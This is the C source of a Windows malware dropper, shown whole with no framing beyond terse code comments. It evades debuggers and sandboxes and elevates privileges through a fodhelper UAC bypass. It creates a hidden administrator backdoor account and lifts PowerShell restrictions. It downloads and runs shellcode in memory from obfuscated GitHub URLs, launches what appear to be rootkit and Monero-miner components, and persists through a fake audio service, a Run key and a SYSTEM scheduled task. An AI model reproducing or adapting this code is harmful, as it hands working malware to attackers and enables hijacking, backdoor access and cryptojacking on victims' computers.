#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <sddl.h>
#include <wininet.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define PAYLOAD_DELAY 30000
#define EVASION_SEED 0xDEADBEEF

// Global state
static const char* g_backdoorUsername = "TBuG";
static BOOL g_accountCreated = FALSE;
static char g_mallDir[MAX_PATH] = {0};
static char g_svchostPath[MAX_PATH] = {0};

// Obfuscated strings
typedef struct {
    DWORD key;
    BYTE* data;
    size_t len;
} OBF_STR;

// Anti-analysis prototypes
void AntiSandbox();
void AntiDebug();
BOOL IsDebugged();
void RandomSleep(DWORD base, DWORD variance);
void EvadeMemoryScanners();

// Privilege and execution
BOOL ElevatePrivileges();
BOOL IsAdmin();
void CreateBackdoorAccount();
void RemoveBackdoorAccount();
void DisablePowerShellRestrictions();

// Payload handling
void DownloadAndExecutePayloads();
BYTE* DownloadToMemory(const char* url, DWORD* pSize);
BOOL ExecuteMemory(BYTE* payload, DWORD size);
void DownloadFile(const char* url, const char* savePath);
void RunHiddenCommand(LPCSTR command);
void AddToStartup(const char* appName, const char* appPath);
void EstablishPersistence();
void CleanupTemporaryResources();

// Utilities
OBF_STR ObfuscateString(const char* input, DWORD key);
char* Deobfuscate(const OBF_STR* obf);
void SecureFree(void* ptr, size_t size);
void CleanTrace();

// Random generator
static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

// String obfuscation
OBF_STR ObfuscateString(const char* input, DWORD key) {
    size_t len = strlen(input) + 1;  // Include null terminator
    BYTE* data = (BYTE*)malloc(len);
    if (!data) return (OBF_STR){0, NULL, 0};
    
    DWORD dynamicKey = key;
    for (size_t i = 0; i < len; i++) {
        data[i] = input[i] ^ (dynamicKey & 0xFF);
        dynamicKey = (dynamicKey >> 3) | (dynamicKey << 29);
    }
    return (OBF_STR){key, data, len};
}

char* Deobfuscate(const OBF_STR* obf) {
    if (!obf->data) return NULL;
    char* output = (char*)malloc(obf->len);
    if (!output) return NULL;
    
    DWORD dynamicKey = obf->key;
    for (size_t i = 0; i < obf->len; i++) {
        output[i] = obf->data[i] ^ (dynamicKey & 0xFF);
        dynamicKey = (dynamicKey >> 3) | (dynamicKey << 29);
    }
    return output;
}

// Secure memory zeroing
void SecureFree(void* ptr, size_t size) {
    if (ptr) {
        SecureZeroMemory(ptr, size);
        free(ptr);
    }
}

// Advanced anti-debugging
void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    
    // Check process list for analysis tools
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            const char* tools[] = {"ollydbg", "ida", "wireshark", "procmon", "vboxservice"};
            do {
                for (int i = 0; i < sizeof(tools)/sizeof(tools[0]); i++) {
                    if (StrStrIA(pe32.szExeFile, tools[i])) {
                        ExitProcess(0);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Check for hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            ExitProcess(0);
        }
    }
}

// Enhanced sandbox evasion
void AntiSandbox() {
    // Time manipulation check
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    // Memory check
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    
    // CPU core check
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 4) ExitProcess(0);
    
    // Disk size check
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, &freeBytes, NULL);
    if (freeBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)) ExitProcess(0);
}

// Privilege escalation with UAC bypass
BOOL ElevatePrivileges() {
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return FALSE;

    // Use fodhelper UAC bypass
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey) != ERROR_SUCCESS) 
        return FALSE;
    
    DWORD pathLen = lstrlenA(selfPath) + 1;
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)selfPath, pathLen);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);
    
    // Trigger activation
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpFile = "cmd.exe";
    sei.lpParameters = "/c start fodhelper.exe";
    sei.nShow = SW_HIDE;
    
    if (!ShellExecuteExA(&sei)) return FALSE;
    
    // Cleanup
    Sleep(5000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return TRUE;
}

// Admin check
BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if(AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// Backdoor account with random password
void CreateBackdoorAccount() {
    USER_INFO_1 ui = {0};
    NET_API_STATUS status;
    WCHAR usernameW[MAX_PATH] = {0};
    
    // Convert username
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Generate random password
    WCHAR passwordW[32] = {0};
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE random[16];
        CryptGenRandom(hProv, sizeof(random), random);
        for (int i = 0; i < 15; i++) {
            passwordW[i] = L'a' + (random[i] % 26);
        }
        passwordW[15] = L'\0';
        CryptReleaseContext(hProv, 0);
    } else {
        const char* password = "P@ssw0rd123!";
        MultiByteToWideChar(CP_UTF8, 0, password, -1, passwordW, MAX_PATH);
    }
    
    // Check if account exists
    LPBYTE userInfo = NULL;
    if (NetUserGetInfo(NULL, usernameW, 1, &userInfo) == NERR_Success) {
        NetApiBufferFree(userInfo);
        g_accountCreated = TRUE;
        return;
    }
    
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    status = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (status != NERR_Success) return;
    
    g_accountCreated = TRUE;
    
    // Add to administrators group
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = usernameW;
    status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Add-LocalGroupMember -Group 'Administrators' -Member '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        RunHiddenCommand(psCmd);
    }
    
    // Hide account
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_backdoorUsername, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Remove from Users group
    LOCALGROUP_MEMBERS_INFO_3 removeInfo = {0};
    removeInfo.lgrmi3_domainandname = usernameW;
    NetLocalGroupDelMembers(NULL, L"Users", 3, (LPBYTE)&removeInfo, 1);
}

// Account removal
void RemoveBackdoorAccount() {
    if (!g_accountCreated) return;

    WCHAR usernameW[MAX_PATH];
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Delete account
    NET_API_STATUS status = NetUserDel(NULL, usernameW);
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        RunHiddenCommand(psCmd);
    }
    
    // Clean registry entry
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, g_backdoorUsername);
        RegCloseKey(hKey);
    }
}

// Disable PowerShell restrictions
void DisablePowerShellRestrictions() {
    HKEY hKey;
    OBF_STR subkey = ObfuscateString("SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell", EVASION_SEED);
    OBF_STR value = ObfuscateString("ExecutionPolicy", EVASION_SEED);
    OBF_STR data = ObfuscateString("Unrestricted", EVASION_SEED);
    
    char* realSubkey = Deobfuscate(&subkey);
    char* realValue = Deobfuscate(&value);
    char* realData = Deobfuscate(&data);
    
    if (!realSubkey || !realValue || !realData) return;
    
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, realSubkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD dataLen = strlen(realData) + 1;
        RegSetValueExA(hKey, realValue, 0, REG_SZ, (const BYTE*)realData, dataLen);
        RegCloseKey(hKey);
    }
    
    SecureFree(realSubkey, subkey.len);
    SecureFree(realValue, value.len);
    SecureFree(realData, data.len);
    SecureFree(subkey.data, subkey.len);
    SecureFree(value.data, value.len);
    SecureFree(data.data, data.len);
}

// Download with retries
void DownloadFile(const char* url, const char* savePath) {
    for (int attempt = 0; attempt < 3; attempt++) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) continue;
        
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            continue;
        }
        
        HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
            FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            continue;
        }
        
        BYTE buffer[4096];
        DWORD bytesRead, bytesWritten;
        BOOL downloadSuccess = TRUE;
        
        while (downloadSuccess && InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            if (bytesRead == 0) break;
            if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || 
                bytesWritten != bytesRead) {
                downloadSuccess = FALSE;
            }
        }
        
        CloseHandle(hFile);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        // Verify file downloaded successfully
        HANDLE hFileCheck = CreateFileA(savePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFileCheck != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFileCheck, NULL);
            CloseHandle(hFileCheck);
            if (fileSize > 1024) {
                return;
            }
        }
        
        DeleteFileA(savePath);
        Sleep(2000); // Wait before retry
    }
}

// Run commands hidden
void RunHiddenCommand(LPCSTR command) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmdLine[512];
    wsprintfA(cmdLine, "cmd.exe /c %s", command);
    
    CreateProcessA(
        NULL, cmdLine, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Memory-based payload execution
BOOL ExecuteMemory(BYTE* payload, DWORD size) {
    if (size < 2 || payload[0] != 'M' || payload[1] != 'Z') return FALSE;

    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return FALSE;
    
    // Copy and execute
    memcpy(execMem, payload, size);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, PAYLOAD_DELAY);
    CloseHandle(hThread);
    return TRUE;
}

// Helper to download to memory
BYTE* DownloadToMemory(const char* url, DWORD* pSize) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return NULL;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    // Determine content length
    DWORD contentLength = 0;
    DWORD len = sizeof(contentLength);
    if (!HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                       &contentLength, &len, NULL) || contentLength == 0) {
        // If content length unavailable, read in chunks
        BYTE buffer[4096];
        DWORD bytesRead;
        DWORD totalRead = 0;
        BYTE* dynamicBuffer = NULL;
        
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            if (bytesRead == 0) break;
            BYTE* newBuffer = realloc(dynamicBuffer, totalRead + bytesRead);
            if (!newBuffer) {
                free(dynamicBuffer);
                InternetCloseHandle(hUrl);
                InternetCloseHandle(hInternet);
                return NULL;
            }
            dynamicBuffer = newBuffer;
            memcpy(dynamicBuffer + totalRead, buffer, bytesRead);
            totalRead += bytesRead;
        }
        
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        if (totalRead == 0) {
            free(dynamicBuffer);
            return NULL;
        }
        
        *pSize = totalRead;
        return dynamicBuffer;
    }
    
    // Allocate memory for known content length
    BYTE* buffer = (BYTE*)malloc(contentLength);
    if (!buffer) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    // Read data
    DWORD bytesRead, totalRead = 0;
    BOOL success = TRUE;
    while (totalRead < contentLength) {
        if (!InternetReadFile(hUrl, buffer + totalRead, contentLength - totalRead, &bytesRead)) {
            success = FALSE;
            break;
        }
        if (bytesRead == 0) break;
        totalRead += bytesRead;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    if (!success || totalRead == 0) {
        free(buffer);
        return NULL;
    }
    
    *pSize = totalRead;
    return buffer;
}

// Payload installation
void DownloadAndExecutePayloads() {
    char appDataPath[MAX_PATH];
    if (!GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH)) {
        return;
    }
    
    // Create hidden directory
    lstrcpyA(g_mallDir, appDataPath);
    PathAppendA(g_mallDir, "Microsoft\\Windows\\Templates\\$77-mall");
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryA(g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    
    // Download shellcode
    OBF_STR shellcodeUrl = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/install.shellcode", EVASION_SEED);
    char* realUrl = Deobfuscate(&shellcodeUrl);
    
    DWORD shellcodeSize;
    BYTE* shellcode = DownloadToMemory(realUrl, &shellcodeSize);
    
    if (shellcode && shellcodeSize > 0) {
        ExecuteMemory(shellcode, shellcodeSize);
        SecureFree(shellcode, shellcodeSize);
    } else {
        // Fallback to on-disk method
        OBF_STR domain = ObfuscateString("github.com", EVASION_SEED);
        OBF_STR path = ObfuscateString("/Drakovthe6th/TBuG/raw/master/mall.zip", EVASION_SEED);
        char* realDomain = Deobfuscate(&domain);
        char* realPath = Deobfuscate(&path);
        
        char mallUrl[256];
        lstrcpyA(mallUrl, "https://");
        lstrcatA(mallUrl, realDomain);
        lstrcatA(mallUrl, realPath);
        
        char zipPath[MAX_PATH];
        lstrcpyA(zipPath, g_mallDir);
        PathRemoveFileSpecA(zipPath); // Go to parent directory
        PathAppendA(zipPath, "mall.zip");
        
        DownloadFile(mallUrl, zipPath);
        
        // Extract with PowerShell
        char psCmd[512];
        wsprintfA(psCmd, 
            "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
            zipPath, 
            g_mallDir
        );
        RunHiddenCommand(psCmd);
        
        DeleteFileA(zipPath);
        
        SecureFree(realDomain, domain.len);
        SecureFree(realPath, path.len);
        SecureFree(domain.data, domain.len);
        SecureFree(path.data, path.len);
        
        // Execute from disk
        char shellcodePath[MAX_PATH];
        lstrcpyA(shellcodePath, g_mallDir);
        PathAppendA(shellcodePath, "install.shellcode");
        
        HANDLE hFile = CreateFileA(shellcodePath, GENERIC_READ, FILE_SHARE_READ, 
                                  NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                BYTE* fileData = (BYTE*)malloc(fileSize);
                if (fileData) {
                    DWORD bytesRead;
                    if (ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) && 
                        bytesRead == fileSize) {
                        ExecuteMemory(fileData, fileSize);
                    }
                    SecureFree(fileData, fileSize);
                }
            }
            CloseHandle(hFile);
        }
    }
    
    // Configure port hiding
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
        DWORD port = 443;
        RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
        RegCloseKey(hKey);
    }

    // Execute $77-Egde.exe
    char edgePath[MAX_PATH];
    lstrcpyA(edgePath, g_mallDir);
    PathAppendA(edgePath, "$77-Egde.exe");
    lstrcpyA(g_svchostPath, edgePath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(edgePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Execute $77-SystemHelper.exe if present
    char helperPath[MAX_PATH];
    lstrcpyA(helperPath, g_mallDir);
    PathAppendA(helperPath, "$77-SystemHelper.exe");
    if (GetFileAttributesA(helperPath) != INVALID_FILE_ATTRIBUTES) {
        CreateProcessA(helperPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    SecureFree(realUrl, shellcodeUrl.len);
    SecureFree(shellcodeUrl.data, shellcodeUrl.len);
}

// Startup persistence
void AddToStartup(const char* appName, const char* appPath) {
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD pathLen = lstrlenA(appPath) + 1;
        RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
        RegCloseKey(hKey);
    }
    
    // Scheduled task persistence
    char cmd[512];
    lstrcpyA(cmd, "schtasks /create /tn \"");
    lstrcatA(cmd, appName);
    lstrcatA(cmd, "\" /tr \"\"");
    lstrcatA(cmd, appPath);
    lstrcatA(cmd, "\"\" /sc onlogon /ru SYSTEM /f");
    RunHiddenCommand(cmd);
}

// Persistence setup
void EstablishPersistence() {
    if (GetFileAttributesA(g_svchostPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Service-based persistence (primary)
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scm) {
        char displayName[] = "Windows Audio Extension";
        char svcPath[MAX_PATH + 10];
        wsprintfA(svcPath, "\"%s\" --service", g_svchostPath);
        
        SC_HANDLE svc = CreateServiceA(
            scm, "AudiosrvExt", displayName,
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
            svcPath, NULL, NULL, NULL, NULL, NULL
        );
        
        if (svc) {
            SERVICE_DESCRIPTION sd = {"Manages audio enhancements"};
            ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &sd);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    
    // Fallback methods
    OBF_STR startupName = ObfuscateString("WindowsHostService", EVASION_SEED);
    char* realName = Deobfuscate(&startupName);
    if (realName) {
        AddToStartup(realName, g_svchostPath);
        SecureFree(realName, startupName.len);
    }
    SecureFree(startupName.data, startupName.len);
}

// Temporary resource cleanup
void CleanupTemporaryResources() {
    RemoveBackdoorAccount();
    
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathRemoveFileSpecA(zipPath);
    PathAppendA(zipPath, "mall.zip");
    DeleteFileA(zipPath);
    
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    PathAppendA(batchPath, "sysclean.bat");
    DeleteFileA(batchPath);
}

// Random sleep to evade timing analysis
void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AntiDebug();
    AntiSandbox();
    RandomSleep(5000, 2000);
    
    if(!IsAdmin()) {
        if (!ElevatePrivileges()) {
            return 0;
        }
        return 0; // Exit after elevation attempt
    }
    
    // Initialize random seed
    my_srand(GetTickCount());
    
    // Error-protected execution sequence
    int stages = 0;
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (!(stages & 1)) {
            CreateBackdoorAccount();
            stages |= 1;
        }
        
        if (!(stages & 2)) {
            DisablePowerShellRestrictions();
            stages |= 2;
        }
        
        if (!(stages & 4)) {
            DownloadAndExecutePayloads();
            stages |= 4;
        }
        
        if (!(stages & 8)) {
            EstablishPersistence();
            stages |= 8;
        }
        
        if (stages == 0xF) break;
        RandomSleep(5000, 3000);
    }
    
    // Final cleanup with delay
    RandomSleep(PAYLOAD_DELAY, 15000);
    CleanupTemporaryResources();
    
    return 0;
}